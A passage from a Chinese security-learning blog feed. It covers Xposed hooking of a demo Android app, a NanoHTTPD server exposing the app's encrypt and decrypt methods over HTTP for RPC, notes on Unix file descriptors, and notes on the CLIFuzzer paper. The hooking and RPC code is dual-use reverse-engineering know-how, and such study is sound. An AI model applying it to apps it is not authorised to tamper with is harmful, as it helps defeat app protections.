Throwable&#123;</span><br><span class="line">                <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                <span class="comment">// 获取 MainActivity 对象</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">mMainActivity</span> <span class="operator">=</span> param.thisObject;</span><br><span class="line">                <span class="comment">// 主动调用 method01 与 method02 函数</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">cipherText</span> <span class="operator">=</span> (String)XposedHelpers.callMethod(mMainActivity, <span class="string">&quot;method01&quot;</span>, <span class="string">&quot;wd2711&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">clearText</span> <span class="operator">=</span> (String)XposedHelpers.callMethod(mMainActivity, <span class="string">&quot;method02&quot;</span>, <span class="string">&quot;47fcda3822cd10a8e2f667fa49da783f&quot;</span>);</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;(1) cipherText =&gt; &quot;</span> + cipherText);</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;(1) clearText =&gt; &quot;</span> + clearText);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 方法2：通过 newInstance 获取对象实例</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">newMainActivity</span> <span class="operator">=</span> XposedHelpers.newInstance(clazz);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cipherText</span> <span class="operator">=</span> (String)XposedHelpers.callMethod(newMainActivity, <span class="string">&quot;method01&quot;</span>, <span class="string">&quot;wd2711&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">clearText</span> <span class="operator">=</span> (String)XposedHelpers.callMethod(newMainActivity, <span class="string">&quot;method02&quot;</span>, <span class="string">&quot;47fcda3822cd10a8e2f667fa49da783f&quot;</span>);</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;(2) cipherText =&gt; &quot;</span> + cipherText);</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;(2) clearText =&gt; &quot;</span> + clearText);</span><br><span class="line">        <span class="comment">// logic-4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;结果如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231022154106062.png" alt="image-20231022154106062" style="zoom:67%;" /></p><p>&emsp;接下来，导入NanoHTTPD以进行RPC：</p><p>（1）在app/build.gradle文件的dependencies下增加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation &#x27;org.nanohttpd:nanohttpd:2.3.1&#x27;</span><br></pre></td></tr></table></figure><p>&emsp;Nanohttpd只存在一个抽象类NanoHTTPD，主要有：start（启动web服务器）、stop（停止web服务器）、serve（收到web请求后的回调函数）。<code>serve只有一个参数，为IHTTPSession类型，可用于判断浏览器请求内容，包括请求方法、参数、URL等。</code>NanoHTTPD的构造函数可以指定web服务监听的端口。在此，简单的以NanoHTTPD实现hello world界面（应该加在上述代码的logic-4中）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_">NanoHTTPD</span>&#123;</span><br><span class="line">    <span class="comment">// App 构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">App</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="comment">// 指定监听端口</span></span><br><span class="line">        <span class="built_in">super</span>(<span class="number">8899</span>);</span><br><span class="line">        <span class="comment">// start 启动 HTTP 服务</span></span><br><span class="line">        start(NanoHTTPD.SOCKET_READ_TIMEOUT, <span class="literal">true</span>);</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Running!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// serve 回调函数</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> NanoHTTPD.Response <span class="title function_">serve</span><span class="params">(IHTTPSession session)</span>&#123;</span><br><span class="line">        <span class="comment">// 获取 HTTP 方法：POST、GET</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> session.getMethod();</span><br><span class="line">        <span class="comment">// 获取 URI</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> session.getUri();</span><br><span class="line">        <span class="comment">// 获取访问者 IP</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">RemoteIP</span> <span class="operator">=</span> session.getRemoteIpAddress();</span><br><span class="line">        <span class="comment">// 获取访问者 HostName</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">RemoteHostName</span> <span class="operator">=</span> session.getRemoteHostName();</span><br><span class="line">        Log.i(<span class="string">&quot;nanohttpd&quot;</span>, <span class="string">&quot;Method =&gt; &quot;</span> + method);</span><br><span class="line">        Log.i(<span class="string">&quot;nanohttpd&quot;</span>, <span class="string">&quot;URI =&gt; &quot;</span> + uri);</span><br><span class="line">        Log.i(<span class="string">&quot;nanohttpd&quot;</span>, <span class="string">&quot;Remote_IP =&gt; &quot;</span> + RemoteIP);</span><br><span class="line">        Log.i(<span class="string">&quot;nanohttpd&quot;</span>, <span class="string">&quot;RemoteHostName =&gt; &quot;</span> + RemoteHostName);</span><br><span class="line">        <span class="comment">// 页面返回值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;&lt;html&gt;&lt;body&gt;Hello wd2711\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> newFixedLengthResponse(Response.Status.OK, NanoHTTPD.MIME_PLAINTEXT, msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">App</span>();</span><br></pre></td></tr></table></figure><p>&emsp;安装好xposed插件，启动demoso1，并访问<code>手机IP+端口</code>，结果显示如下：</p><p><img src="/images/frida-reverse-analysis-2/image-20231022160559470.png" alt="image-20231022160559470" style="zoom:67%;" /></p><p>&emsp;浏览器访问结果如下：</p><p><img src="/images/frida-reverse-analysis-2/image-20231022160635723.png" alt="image-20231022160635723" style="zoom:67%;" /></p><p>（2）经过上面的测试，NanoHTTPD服务启动正常，接着更改serve内容，以增加函数主动调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> NanoHTTPD.Response <span class="title function_">serve</span><span class="params">(IHTTPSession session)</span>&#123;</span><br><span class="line">    <span class="comment">// 获取 URI</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> session.getUri();</span><br><span class="line">    <span class="comment">// 解析 POST 方法访问时的传参内容</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">paramBody</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    Map&lt;String, String&gt;params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// session.parseBody(params) 的目的是试着 parse 一下，看 session 是否是合理的</span></span><br><span class="line">        session.parseBody(params);</span><br><span class="line">        paramBody = session.getQueryParameterString();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(ResponseException e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(uri.contains(<span class="string">&quot;encrypt&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">// getActivity() 函数返回之前获取的 MainActivity 对象</span></span><br><span class="line">        result = (String)XposedHelpers.callMethod(getActivity(), <span class="string">&quot;method01&quot;</span>, paramBody);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(uri.contains(<span class="string">&quot;decrypt&quot;</span>))&#123;</span><br><span class="line">        result = (String)XposedHelpers.callMethod(getActivity(), <span class="string">&quot;method02&quot;</span>, paramBody);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newFixedLengthResponse(Response.Status.OK, NanoHTTPD.MIME_PLAINTEXT, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;安装好xposed插件，启动demoso1，使用 curl进行post，结果如下：</p><p><img src="/images/frida-reverse-analysis-2/image-20231022164520100.png" alt="image-20231022164520100" style="zoom:67%;" /></p><p>（3）最后，使用python进行进一步封装：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">param</span>):</span><br><span class="line">    url = <span class="string">&quot;http://192.168.48.14:8899/encrypt&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    r = requests.post(url = url, data = param, headers = headers)</span><br><span class="line">    <span class="built_in">print</span>(r.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">param</span>):</span><br><span class="line">    url = <span class="string">&quot;http://192.168.48.14:8899/decrypt&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    r = requests.post(url = url, data = param, headers = headers)</span><br><span class="line">    <span class="built_in">print</span>(r.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    encrypt(<span class="string">&quot;wd&quot;</span>)</span><br><span class="line">    decrypt(<span class="string">&quot;169dc260893dab88cd619d5e35e17634&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>&emsp;Hook上，frida与xposed不分伯仲。但是<code>在细节上，xposed支持使用setAdditionalInstanceField、setAdditionalStaticField等函数给实例对象添加动静态成员，而frida支持Java.choose从进程堆中搜索目标对象。在宏观上，frida可以热重载（不用重启），作用对象是特定进程，Hook原理类似于调试器，而xposed针对所有进程，类似于系统框架级服务。</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Frida逆向与协议分析-2&quot;&gt;&lt;a href=&quot;#Frida逆向与协议分析-2&quot; class=&quot;headerlink&quot; title=&quot;Frida逆向与协议分析-2&quot;&gt;&lt;/a&gt;Frida逆向与协议分析-2&lt;/h1&gt;&lt;p&gt;&amp;emsp;frida逆向与协议分析第二部分。&lt;/p&gt;</summary>
    
    
    
    <category term="re-book" scheme="https://wd-2711.tech/categories/re-book/"/>
    
    
  </entry>
  
  <entry>
    <title>intern-ms-prepare</title>
    <link href="https://wd-2711.tech/2023/09/25/intern-ms-prepare/"/>
    <id>https://wd-2711.tech/2023/09/25/intern-ms-prepare/</id>
    <published>2023-09-25T08:14:56.000Z</published>
    <updated>2023-10-07T06:51:04.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c963127f8aac97877aec58fbe696cb289c48ded0a8b52877523164b0abe6471a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="杂记" scheme="https://wd-2711.tech/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Computer-Science-from-the-Bottom-Up-Note-1</title>
    <link href="https://wd-2711.tech/2023/09/14/Computer-Science-from-the-Bottom-Up-Note-1/"/>
    <id>https://wd-2711.tech/2023/09/14/Computer-Science-from-the-Bottom-Up-Note-1/</id>
    <published>2023-09-14T15:25:40.000Z</published>
    <updated>2023-10-13T09:49:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Computer-Science-from-the-Bottom-Up-Notes-1"><a href="#Computer-Science-from-the-Bottom-Up-Notes-1" class="headerlink" title="Computer Science from the Bottom Up Notes-1"></a>Computer Science from the Bottom Up Notes-1</h1><p>&emsp;看到一本很好的书，<a href="https://bottomupcs.com/index.html">链接</a>，感觉对自己的安全基础很有帮助。</p><span id="more"></span><h2 id="General-Unix-and-Advanced-C"><a href="#General-Unix-and-Advanced-C" class="headerlink" title="General Unix and Advanced C"></a>General Unix and Advanced C</h2><p>&emsp;Linux 或 BSD 等类 UNIX 系统的原则：一切皆文件。</p><h3 id="抽象与API实现"><a href="#抽象与API实现" class="headerlink" title="抽象与API实现"></a>抽象与API实现</h3><p>&emsp;Linux源码中经常出现，如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 需要实现的 API */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">greet_api</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">int</span> (*say_hello)(<span class="type">char</span> *name);</span><br><span class="line"><span class="built_in">int</span> (*say_goodbye)(<span class="type">void</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">say_hello_fn</span><span class="params">(<span class="type">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, name);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">say_goodbye_fn</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Goodbye\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 实现 API 的结构 */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">greet_api</span> greet_api =</span><br><span class="line">&#123;</span><br><span class="line">.say_hello = say_hello_fn,</span><br><span class="line">.say_goodbye = say_goodbye_fn</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">greet_api.<span class="built_in">say_hello</span>(argv[<span class="number">1</span>]);</span><br><span class="line">greet_api.<span class="built_in">say_goodbye</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p, %p, %p\n&quot;</span>, greet_api.say_hello, say_hello_fn, &amp;say_hello_fn);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;在来看一个例子virtio.h：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">virtio_driver</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">device_driver</span> driver;</span><br><span class="line">        <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">virtio_device_id</span> *id_table;</span><br><span class="line">        <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> *feature_table;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> feature_table_size;</span><br><span class="line">        <span class="built_in">int</span> (*probe)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line">        <span class="built_in">void</span> (*scan)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line">        <span class="built_in">void</span> (*remove)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line">        <span class="built_in">void</span> (*config_changed)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PM</span></span><br><span class="line">        <span class="built_in">int</span> (*freeze)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line">        <span class="built_in">int</span> (*restore)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>&emsp;这与上方的greet_api是类似的，都写了期望提供的函数。<strong>UNIX平台的标准库一般被称为libc。它提供了系统的基本接口：read()、write()和printf()等基本调用，这个API由一个名为POSIX的规范完整描述。</strong></p><h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>&emsp;每个运行的程序开始时都有三个已经打开的文件：标准输入、标准输出、标准错误。</p><p><img src="/images/Computer-Science-from-the-Bottom-Up-Note-1/image-20231013134721266.png" alt="image-20231013134721266" style="zoom:67%;" /></p><p>&emsp;打开文件使用open API，其返回<code>文件描述符</code>，本质上是<code>内核存储的文件描述符表的索引</code>。内核创建<code>文件描述符</code>以响应open调用，并将<code>文件描述符</code>与<code>底层类似文件的对象的某种抽象</code>相关联，该对象可以是实际的硬件设备、文件系统。操作系统要求程序员创建设备驱动程序，以便能够与硬件设备通信，设备驱动提供了由内核调用的一系列函数。如下图所示：<code>驱动程序提供了一个read write函数，驱动程序知道如何将这些通用请求转换为特定设备的特定请求</code>。</p><p><img src="/images/Computer-Science-from-the-Bottom-Up-Note-1/image-20231013135901371.png" alt="image-20231013135901371" style="zoom:67%;" /></p><p>&emsp;内核通过称为<code>设备层</code>的东西提供了文件接口。主机上的物理设备由特殊文件系统<code>/dev</code>中的文件表示。设备节点有主要和次要编号（<code>/dev/null</code>、<code>/dev/zero</code>、<code>/dev/tty</code>），这允许内核将特定节点与底层驱动程序相关联。</p><p>&emsp;当文件被打开时，内核使用路径信息将文件描述符映射到提供读写功能的东西上，具体而言，文件描述符会定位到挂载点，挂载点下打开的文件可以被定向到系统文件驱动程序。</p><p>&emsp;<code>理解内核就是理解API是如何相互关联和共存的</code>。</p><p>&emsp;shell例如bash、zsh、csh，它们可以帮助用户与操作系统交互。一些shell数据传递方式如下：</p><p><img src="/images/Computer-Science-from-the-Bottom-Up-Note-1/image-20231013174154191.png" alt="image-20231013174154191" style="zoom:67%;" /></p><p>&emsp;例如<code>ls|more</code>，其不是将标准输出的文件描述符与某种底层设备（如控制台，用于输出到终端）相关联，而是将描述符指向内核提供的内存缓冲区，通常称为管道。</p><h2 id="Binary-and-Number-Representation"><a href="#Binary-and-Number-Representation" class="headerlink" title="Binary and Number Representation"></a>Binary and Number Representation</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Computer-Science-from-the-Bottom-Up-Notes-1&quot;&gt;&lt;a href=&quot;#Computer-Science-from-the-Bottom-Up-Notes-1&quot; class=&quot;headerlink&quot; title=&quot;Computer Science from the Bottom Up Notes-1&quot;&gt;&lt;/a&gt;Computer Science from the Bottom Up Notes-1&lt;/h1&gt;&lt;p&gt;&amp;emsp;看到一本很好的书，&lt;a href=&quot;https://bottomupcs.com/index.html&quot;&gt;链接&lt;/a&gt;，感觉对自己的安全基础很有帮助。&lt;/p&gt;</summary>
    
    
    
    <category term="cs-books" scheme="https://wd-2711.tech/categories/cs-books/"/>
    
    
  </entry>
  
  <entry>
    <title>CLIFuzzer</title>
    <link href="https://wd-2711.tech/2023/09/14/CLIFuzzer/"/>
    <id>https://wd-2711.tech/2023/09/14/CLIFuzzer/</id>
    <published>2023-09-14T02:32:24.000Z</published>
    <updated>2023-09-14T15:16:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CLIFuzzer：命令行调用的挖掘语法"><a href="#CLIFuzzer：命令行调用的挖掘语法" class="headerlink" title="CLIFuzzer：命令行调用的挖掘语法"></a>CLIFuzzer：命令行调用的挖掘语法</h1><p>&emsp;很多程序都靠命令行来传递选项和参数，因此要对这些程序做测试，需要遍历所有的命令行选项。CLIFuzzer使用动态分析来跟踪输入，并自动提取参数，我们可以变换不同的输入参数，生成无穷的随机参数列表，对程序进行模糊测试，提高代码覆盖率。</p><span id="more"></span><p>&emsp;注：与之很相似的有基于变异的fuzzer，它通过对输入数据进行随机变异和扰动来寻找软件的异常行为。这种模糊测试方法基于以下假设：在输入数据中的细微变化和异常情况可能会引发软件中的漏洞。</p><p>&emsp;命令行程序输入参数的格式为<code>$&lt;程序名&gt; &lt;parameter&gt;*</code>。其中，<code>&lt;parameter&gt;</code>要么为参数名，例如<code>-v|-a</code>，要么为参数值，例如<code>1.txt</code>等。目前，已经有很多研究关注于命令行程序，其局限性在于：<strong>只测试标准输入</strong>，即要么忽略程序接受的不同选项，要么只用特定的选项序列。还有的研究通过分析<code>--help</code>来获得选项集，但是<code>--help</code>选项可能不存在。</p><p>&emsp;而CLIFuzzer可以从代码中自动确定选项列表，这基于一个假设：大多数的程序使用类似于<code>getopt()</code>之类的选项parser。在本论文中，主要是针对python的argparse进行原型设计，以创建命令行参数的语法。进一步地，我们将上述原型转为针对C语言的，使用<code>getopt()</code>来进行模糊测试的fuzzer。但是，<code>getopt()</code>无法获得选项类型，因此，我们通过跟踪运行时库函数（<code>runtime library function</code>）来获得选项类型。最终，CLIFuzzer获得了能准确描述程序参数的一套语法，如下所示，<code>ls</code>命令的语法为：</p><p><img src="/images/CLIFuzzer/image-20230914110731000.png" alt="image-20230914110731000" style="zoom:67%;" /></p><p>&emsp;CLIFuzzer利用这套语法创建无穷的命令行序列，来测试程序。</p><h2 id="getopt-函数"><a href="#getopt-函数" class="headerlink" title="getopt()函数"></a><code>getopt()</code>函数</h2><p>&emsp;标准C语言库函数parse命令行主要用<code>getopt | getopt_long | getopt_long_only</code>函数。这些函数中的两个参数定义可能的选项：</p><p>（1）<code>optstring</code>。保存程序的短选项（例如<code>-a</code>）。举个例子，<code>optstring=&quot;1ac:d::&quot;</code>，这代表一个短选项列表，见<a href="https://www.cnblogs.com/yhjoker/p/13873739.html">链接</a>。选项类型分为3种：（a）不带值的参数，其定义就是参数本身；（b）必须带值的参数，在定义后加<code>:</code>；（c）可选值的参数，在定义后加<code>::</code>。其表示语法如下（其中<code>&lt;prefix&gt;</code>不知道是什么？）：</p><p><img src="/images/CLIFuzzer/image-20230914113111507.png" alt="image-20230914113111507" style="zoom:67%;" /></p><p>（2）<code>longopts</code>。指向选项结构体的指针，描述了程序接受的长选项。从结构体为：</p><p><img src="/images/CLIFuzzer/image-20230914121158381.png" alt="image-20230914121158381" style="zoom:67%;" /></p><h2 id="参数规范分析"><a href="#参数规范分析" class="headerlink" title="参数规范分析"></a>参数规范分析</h2><p>&emsp;此节的目的是生成参数语法。其步骤为：（1）将选项字符串转为上下文无关的语法。（2）将选项参数转为谓词。（3）参数到谓词。（看不太明白，接着向下看）</p><h3 id="从选项规范（optstring、longopts）构建语法"><a href="#从选项规范（optstring、longopts）构建语法" class="headerlink" title="从选项规范（optstring、longopts）构建语法"></a>从选项规范（optstring、longopts）构建语法</h3><p>&emsp;此步骤将短选项与长选项规范转为上下文无关的语法。我们将<code>getopt</code>函数更改，从而记录参数。更改后的<code>getopt</code>被加入到共享库中，并重写<code>LD_PRELOAD</code>环境变量，以加载此共享库。</p><p>&emsp;一旦CLIFuzzer提取到了<code>optstring</code>，就会用如下算法将短选项转为语法。</p><p><img src="/images/CLIFuzzer/image-20230914123616739.png" alt="image-20230914123616739" style="zoom:67%;" /></p><p>&emsp;上述算法中，首先检查<code>optstring</code>是否以<code>&#39;-&#39;</code>开头。如果是，则表明该程序接受任何未指定的选项字母，而不会立即出现错误，这部分在第 2 节中详细描述。因此，我们将<code>-&lt;letter&gt;</code>附加到上下文无关语法中。如果<code>optstring</code>以<code>:</code>或<code>+</code>开头，它将影响向程序指示缺失参数的方式，具体见<a href="https://www.cnblogs.com/yhjoker/p/13873739.html">链接</a>。然而，它对选项规范没有直接影响，因此跳过。<code>longopts</code>不需要parse，直接转为语法即可。</p><h3 id="挖掘选项参数类型"><a href="#挖掘选项参数类型" class="headerlink" title="挖掘选项参数类型"></a>挖掘选项参数类型</h3><p>&emsp;CLIFuzzer扫描<code>libc</code>，以找寻需要参数的函数。它重写每一个<code>libc</code>的函数，以便调用这些函数时会记录参数。CLIFuzzer使用每个选项的随机参数来调用被测程序（如何理解？），举个例子，如果文件名为参数，那么程序可能会调用<code>open|stat</code>函数；如果以整数为参数，那么程序可能调用<code>atoi|strtol</code>函数；如果以浮点数为参数，那么程序可能调用<code>atof|strtod</code>。</p><h3 id="参数的谓词"><a href="#参数的谓词" class="headerlink" title="参数的谓词"></a>参数的谓词</h3><p>&emsp;最后一步就是找到参数要满足的条件（谓词）（理解的不一定对）。<strong>因此，使用多个参数来调用实用程序来确定程序需要多少个参数。</strong></p><h2 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h2><p>&emsp;程序最起码有一个文件输入，保证完全随机性。选项个数平均数为27，代码量平均为1w行。以AFL++为基线，当程序具有大量有效选项时，CLIFuzzer的覆盖范围明显优于AFL++，因为选项不是AFL++模糊测试过程的一部分。当程序没有有效选项（什么叫有效选项？）时，CLIFuzzer与AFL++的覆盖率相当。但是，CLIFuzzer并不能找到col程序中的crash部分，因为这需要特定字符作为输入，但是AFL++可以，这是因为它的目标就是更高的代码覆盖率。</p><p>&emsp;突然感觉fuzzer的目的是让程序崩溃？</p><p>&emsp;举几个CLIFuzzer找到的崩溃点：</p><p>（1）<code>bison</code>（接受一个上下文无关语法规范作为输入，并生成一个解析器，用于分析输入的语法结构）：当运行<code>bison --trace s1</code>时，会挂起。其中，<code>--trace</code>选项并未在使用文档中提到。</p><p>（2）<code>tac</code>（反向输出）：当运行<code>tac --separator=.+5 --regex E.coli</code>时会挂起，程序会卡在<code>regexec.c</code>中，其中<code>csplit|expr|nl</code>中也调用了此文件，因此猜测这些指令中可能也会出现这种毛病。</p><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h2><p>&emsp;AFL（Americal Fuzzy 